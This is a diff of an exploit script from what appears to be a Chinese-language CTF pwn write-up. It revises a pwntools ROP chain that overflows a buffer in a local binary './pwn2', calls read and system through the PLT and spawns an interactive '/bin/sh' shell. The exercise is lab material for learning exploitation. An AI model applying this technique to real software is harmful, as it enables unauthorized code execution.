@@ -50,27 +50,27 @@ ret2libc 行不通，因為不知道遠 libc 位置 ， 直接串 ROP即可
 from pwn import *
 
 r = process("./pwn2")
+elf = ELF('./pwn2')
+context(arch='amd64',log_level='debug')
 
 offset = 'a'*16
-pop_rsi_r15_ret = p64(0x4006d1)
-pop_rdi_ret = p64(0x4006d3)
+pop_rsi_ret = 0x4006d1
+pop_rdi_ret = 0x4006d3
 
-read_plt = p64(0x4004f0)
-buf = p64(0x601100) # 找一塊有寫入權限的位置來使用
-system_plt = p64(0x4004e0)
-magic = p64(0x4005f7)
+buf = 0x601010
 
-
-payload = flat([offset,
-                pop_rsi_r15_ret,
+payload = flat([
+                offset,
+                pop_rsi_ret,
                 buf,
                 'a' * 8,
-                read_plt,
+                elf.plt['read'],
                 pop_rdi_ret,
                 buf,
-                system_plt,
-                "/bin/sh\x00"])
-
+                elf.plt['system'],
+                ])
 r.sendline(payload)
+r.sendline("/bin/sh")
 r.interactive()
+
 ```
